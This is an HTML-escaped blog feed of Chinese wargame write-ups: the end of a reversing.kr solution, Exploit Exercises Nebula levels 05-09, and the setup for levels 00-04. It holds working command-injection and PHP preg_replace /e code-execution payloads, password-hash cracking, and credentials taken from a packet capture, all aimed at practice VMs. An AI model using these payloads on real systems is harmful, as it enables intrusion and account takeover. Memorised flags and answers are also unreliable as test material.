&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;080484&lt;/span&gt;&lt;span class="no"&gt;CC&lt;/span&gt;                 &lt;span class="no"&gt;movzx&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A020&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;D3&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;78&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;D5&lt;/span&gt;                 &lt;span class="no"&gt;jz&lt;/span&gt;      &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_80484DE&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;D7&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;DC&lt;/span&gt;                 &lt;span class="no"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_80484F5&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;DE&lt;/span&gt; &lt;span class="c"&gt;; ---------------------------------------------------------------------------&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;080484&lt;/span&gt;&lt;span class="no"&gt;DE&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;DE&lt;/span&gt; &lt;span class="no"&gt;loc_80484DE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                            &lt;span class="c"&gt;; CODE XREF: sub_8048451+84j&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;080484&lt;/span&gt;&lt;span class="no"&gt;DE&lt;/span&gt;                 &lt;span class="no"&gt;movzx&lt;/span&gt;   &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;ds&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;byte_804A023&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;E5&lt;/span&gt;                 &lt;span class="no"&gt;cmp&lt;/span&gt;     &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="no"&gt;DDh&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;E7&lt;/span&gt;                 &lt;span class="no"&gt;jz&lt;/span&gt;      &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_80484F0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;E9&lt;/span&gt;                 &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;080484&lt;/span&gt;&lt;span class="nf"&gt;EE&lt;/span&gt;                 &lt;span class="no"&gt;jmp&lt;/span&gt;     &lt;span class="no"&gt;short&lt;/span&gt; &lt;span class="no"&gt;loc_80484F5&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后连续三段对刚才异或后的数字进行操作。异或的反函数还是异或，所以直接异或就能得到结果。这里用python计算一下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x32&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mh"&gt;0x7c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s1"&gt;&amp;#39;N&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x34&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mh"&gt;0x78&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s1"&gt;&amp;#39;L&amp;#39;&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x88&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mh"&gt;0xdd&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="s1"&gt;&amp;#39;U&amp;#39;&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所以[20]=L，[22]=N，[23]=U。&lt;/p&gt;
&lt;p&gt;最后eax置1并返回。这样可以得到答案为&lt;code&gt;L1NUX&lt;/code&gt;。&lt;/p&gt;</content><category term="reversing.kr"></category><category term="wargame"></category><category term="hacking"></category><category term="reversing"></category></entry><entry><title>Exploit Exercises Nebula level05-09 Writeup</title><link href="http://blog.yyx.me/posts/exploit-exercises-nebula-level-05-09.html" rel="alternate"></link><published>2014-09-08T19:18:00-07:00</published><updated>2014-09-08T19:18:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2014-09-08:/posts/exploit-exercises-nebula-level-05-09.html</id><summary type="html">&lt;p&gt;本文为漏洞利用练习网站exploit-exercises.com中Nebula类型题目第05级到09级的完整攻略。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Nebula level05&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Check the flag05 home directory. You are looking for weak directory permissions&lt;/p&gt;
&lt;p&gt;在flag05家目录下找弱权限控制。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;直接查flag05的home目录，发现.backup和.ssh文件很可疑，.ssh没权限，那就.backup。进去之后发现一个.tgz文件，解压之：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tar zxf /home/flag05/.backup/backup-19072011.tgz -C ~/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;此时在自己家目录下也有.ssh文件并具有了flag05的ssh登陆公私钥，这样就可以直接用flag05无密码登陆了。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh flag05@localhost
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你都是flag05了，做什么知道了吧~~&lt;/p&gt;
&lt;h1&gt;Nebula level06&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The flag06 account credentials came from a legacy unix system.&lt;/p&gt;
&lt;p&gt;题目说flag06账户令牌的形式继承于已经被放弃的Unix。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Unix没用过，好惭愧，也不知道什么验证的形式，反正我就直接&lt;code&gt;cat /etc/passwd | more&lt;/code&gt;了，然后发现，flag06账户的密码字段不是&lt;code&gt;x&lt;/code&gt;而是直接一堆值。Google一下发现，因为passwd的r权限太高（主要很多程序把它当用户数据表），因此Linux采用shadow存放密码，这样passwd里就变成x了（其实老师说过的，但是因为现在都是x，所以也就没留意这个问题）。&lt;/p&gt;
&lt;p&gt;OK，既然拿到了flag06密码的密文，那就破解呗。上Kali或者BackTracer5，没这些系统的需要下载并编译&lt;a href="http://www.openwall.com/john/"&gt;John the ripper&lt;/a&gt;来跑字典。我在Kali环境中，把密码那段字符串&lt;code&gt;ueqwOCnSGdsuM&lt;/code&gt;写入/root目录下的flag06passwd文件中（你也可以写整个flag06在passwd中的那行），之后：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;john ~/flag06passwd
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;基本上瞬间就跑出来密码是hello（赤裸裸的弱口令呀），登陆flag06去爽吧。&lt;/p&gt;
&lt;h1&gt;Nebula level07&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;
&lt;p&gt;一个perl脚本，脚本实现了ping主机的功能。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/perl&lt;/span&gt;
&lt;span class="k"&gt;use&lt;/span&gt; &lt;span class="nn"&gt;CGI&lt;/span&gt; &lt;span class="sx"&gt;qw{param}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;Content-type: text/html\n\n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="k"&gt;sub&lt;/span&gt; &lt;span class="nf"&gt;ping&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nv"&gt;$host&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$_&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="nv"&gt;@output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sb"&gt;`ping -c 3 $host 2&amp;gt;&amp;amp;1`&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;foreach&lt;/span&gt; &lt;span class="nv"&gt;$line&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;@output&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$line&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; 

  &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;# check if Host set. if not, display normal page, etc&lt;/span&gt;
&lt;span class="n"&gt;ping&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Host&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;flag07家目录下有一个thttpf.conf（perl服务器配置）和index.cgi（就是这个脚本）。因此需要执行它。根据程序逻辑，传入的&lt;code&gt;Host&lt;/code&gt;参数为ping的地址。漏洞利用思路很简单，传入地址后截断，并执行getflag的代码。&lt;/p&gt;
&lt;p&gt;那就开始行动：首先需要看看perl的服务器跑起来没&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ps aux &lt;span class="p"&gt;|&lt;/span&gt; grep thttpd
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果不幸没跑起来，那就用nebula登陆，之后：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -s
su flag07
/usr/sbin/thttpd -C /home/flag07/thttpf.conf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样先把自己变成root，然后变成flag07，然后把服务器跑起来。当然记得切回level07继续做题。&lt;/p&gt;
&lt;p&gt;之后&lt;code&gt;cat thttp.conf&lt;/code&gt;发现端口是7007，需要打开界面测试了。因为服务器还没配置网络，无法从远程访问，本着能不配置就不配置的的原则（参见开篇），就用curl或者wget吧（因为这个Linux没有图形界面，因此没有浏览器）。很不幸，curl没有，那就wget吧~&lt;/p&gt;
&lt;p&gt;首先测试一下界面：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget http://localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 -O /home/level07/cgi.html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;发现界面OK，之后插入做坏事的代码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget http://localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1&lt;span class="p"&gt;;&lt;/span&gt;/bin/getflag -O /home/level07/cgi.html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;很不幸，报错。根据错误内容发现参数没有解析完，因此对参数用escape编码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget http://localhost:7007/index.cgi?Host&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;127&lt;/span&gt;.0.0.1%3B/bin/getflag -O /home/level07/cgi.html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Done！&lt;/p&gt;
&lt;h1&gt;Nebula level08&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;
&lt;p&gt;又一个全世界可读文件攻击。看看用户想干嘛，然后进入flag08账户。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;题目直接看懵了，什么叫world readable？&lt;/p&gt;
&lt;p&gt;进入level08账户，切换到flag08目录，发现一个.pcap文件，恍然大悟，原来world readable是这个意思……所以说音乐啊美术啊也是world readable啊~好一个形容词。&lt;/p&gt;
&lt;p&gt;既然是.pcap，那就得分析包。得先把.pcap搞出来到有图形界面的机器上。看来还是要配置网络（上一题白偷懒了，出来混，还是要还的T^T）。其实网络配置也很简单，因为非安装的系统，配个临时的网络配置就可以。进入nebula，之后：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo ifconfig eth0 &lt;span class="m"&gt;192&lt;/span&gt;.168.1.50 netmask &lt;span class="m"&gt;255&lt;/span&gt;.255.255.0
sudo ifconfig eth0 up
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样这台机器就有192.168.1.50了ip了，ping一下看看通不通（不通的话查看一下虚拟机的网卡是否开启）。&lt;/p&gt;
&lt;p&gt;继续本着偷懒原则，如果不装软件怎么把这个文件拷贝出来呢。那先查查端口：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;netstat -anpt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;没什么可用端口，不过看到非进程的22端口，想到了sftp。于是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;which sftp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;果然有sftp客户端，继续搜索服务器端，无果。不过没事，有客户端就够了。
在另一台有图形界面的Linux中开启SFTP（ip:192.168.1.200），之后在level08中执行：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sftp root@192.168.1.200
put capture.pcap
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然后在把capture.pcap拖到wireshark里面，开始分析包。预判应该是用户登录过程没加密，然后留下了登录密码之类的信息。所以不出意外应该是TCP包，于是Follow一下TCP包，一行大字映入眼帘&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Password&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;backdoor&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="n"&gt;Rm8&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;ate&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;根据经验，一般16进制工具中&lt;code&gt;.&lt;/code&gt;都是代表&lt;code&gt;\0&lt;/code&gt;，就是字符串结尾（其实&lt;code&gt;.&lt;/code&gt;表示不可读字符，一般在一堆字符串中时基本就是&lt;code&gt;\0&lt;/code&gt;），所以密码应该是backdoor。尝试登录，错误！于是在wireshark中吧TCP包切换到HEX显示，发现这段数据信息如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;000000B9  62                  b
000000BA  61                  a
000000BB  63                  c
000000BC  6b                  k
000000BD  64                  d
000000BE  6f                  o
000000BF  6f                  o
000000C0  72                  r
000000C1  7f                  .
000000C2  7f                  .
000000C3  7f                  .
000000C4  30                  0
000000C5  30                  0
000000C6  52                  R
000000C7  6d                  m
000000C8  38                  8
000000C9  7f                  .
000000CA  61                  a
000000CB  74                  t
000000CC  65                  e
000000CD  0d                  .
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;竟然是7F，查ASCII码表发现7F是Backspace（退格），0D是CR（回车），所以就按照这个顺序重新比划了下，得到密码是backd00Rmate。此题拿下！&lt;/p&gt;
&lt;h1&gt;Nebula level09&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There's a C setuid wrapper for some vulnerable PHP code...&lt;/p&gt;
&lt;p&gt;这是一个C用setuid包装后的脆弱的PHP代码……&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;spam&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$email&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nv"&gt;$email&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;preg_replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/\./&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; dot &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$email&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nv"&gt;$email&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;preg_replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/@/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; AT &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$email&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$email&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;markup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filename&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$use_me&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nv"&gt;$contents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$filename&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="nv"&gt;$contents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;preg_replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/(\[email (.*)\])/e&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;spam(&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;\\&lt;/span&gt;&lt;span class="s2"&gt;2&lt;/span&gt;&lt;span class="se"&gt;\&amp;quot;&lt;/span&gt;&lt;span class="s2"&gt;)&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$contents&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nv"&gt;$contents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;preg_replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/\[/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$contents&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="nv"&gt;$contents&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;preg_replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/\]/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$contents&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$contents&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nv"&gt;$output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;markup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nv"&gt;$argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nv"&gt;$output&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;看到PHP，心中大喜，总算碰到一个相对熟悉的语言，老乡见老乡，两眼泪汪汪啊~~&lt;/p&gt;
&lt;p&gt;flag09目录下有一个可执行的flag09（这就是所谓具有SetUID的C语言包装的PHP解释器吧），还有给出代码的flag09.php。代码逻辑还是很简单的，传入两个参数，一个是文件路径，一个没有用到。根据文件路径读出文件之后把Email那部分读出来，替换掉一些字符（反垃圾邮件），之后输出。&lt;/p&gt;
&lt;p&gt;没看出什么有问题的地方，不过传入参数一定是可以利用的点。preg_replace中的e参数用的不多呀，一般都是用i（忽略大小写）。于是查PHP Manual，果不其然，e使preg_replace第二个参数变成函数执行，就和执行eval一样，另外这个参数太危险，在PHP5.5之后废除改用回调函数实现了。一句话木马暴露了！那就构造一下呗。&lt;/p&gt;
&lt;p&gt;于是构造文件内容为:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[email abc@def.com\&amp;quot;);system(\&amp;quot;getflag]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;照理说第二个参数应该被拼接成:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;quot;spam(\&amp;quot;email abc@def.com\&amp;quot;);system(\&amp;quot;getflag\&amp;quot;)&amp;quot;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样就能顺利执行两个函数了。很可惜，天不由人愿，整个东西都被当做字符串被扔到spam函数里了。所以这里如果要探究得看一下PHP源码中具体的处理过程。&lt;/p&gt;
&lt;p&gt;顿时没思路了……之后Google一下php的preg_replace的e参数的漏洞，发现有利用&lt;code&gt;{${function()}}&lt;/code&gt;的技巧。即在&lt;code&gt;{${}}&lt;/code&gt;包裹后的函数会被执行。于是：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[email {&lt;span class="cp"&gt;${&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;getflag&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="cp"&gt;}&lt;/span&gt;}]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;K.O！&lt;/p&gt;</content><category term="exploit-exercises"></category><category term="nebula"></category><category term="wargame"></category><category term="hacking"></category><category term="exploit"></category></entry><entry><title>Exploit Exercises Nebula level00-04 Writeup</title><link href="http://blog.yyx.me/posts/exploit-exercises-nebula-level-00-04.html" rel="alternate"></link><published>2014-09-06T16:20:00-07:00</published><updated>2014-09-06T16:20:00-07:00</updated><author><name>YYX</name></author><id>tag:blog.yyx.me,2014-09-06:/posts/exploit-exercises-nebula-level-00-04.html</id><summary type="html">&lt;p&gt;本文为漏洞利用练习网站exploit-exercises.com中Nebula类型题目第00级到04级的完整攻略。同时介绍了环境的配置。&lt;/p&gt;</summary><content type="html">&lt;h1&gt;写在前面&lt;/h1&gt;
&lt;p&gt;上上个月成立watch0ut战队之后，开始准备并参与一些CTF比赛。队友大神Jack甩给我们&lt;a href="http://exploit-exercises.com/"&gt;exploit-exercises.com&lt;/a&gt;这个网站，让我们练习练习漏洞利用。&lt;/p&gt;
&lt;p&gt;网站中把漏洞利用分为多类题型，其中Nebula最为简单，主要涉及Linux主机安全及利用的一些常识，可作为整个练习的开始。&lt;/p&gt;
&lt;p&gt;另，本文会遵循能不用安装就安装，能不配置就不配置的最(偷)简(懒)策略来完成所有题型。&lt;/p&gt;
&lt;p&gt;本文会记录我自己做题的思路和手法，供大家参考，也希望诸位能指出我理解或操作不慎处。&lt;/p&gt;
&lt;h1&gt;环境搭建&lt;/h1&gt;
&lt;p&gt;首先&lt;a href="http://exploit-exercises.com/download"&gt;下载&lt;/a&gt;Nebula题目的光盘镜像，该ISO为LiveCD。因此可以不用安装，直接利用现成虚拟机修改为从该ISO启动即可。每次操作完整之后直接点“暂停”保存虚拟机状态即可，下次直接恢复。当然你也可以安装该ISO。&lt;/p&gt;
&lt;p&gt;另外，我使用的光盘为exploit-exercises-nebula-5.iso，本系列Writeup全部在这个版本上完成。&lt;/p&gt;
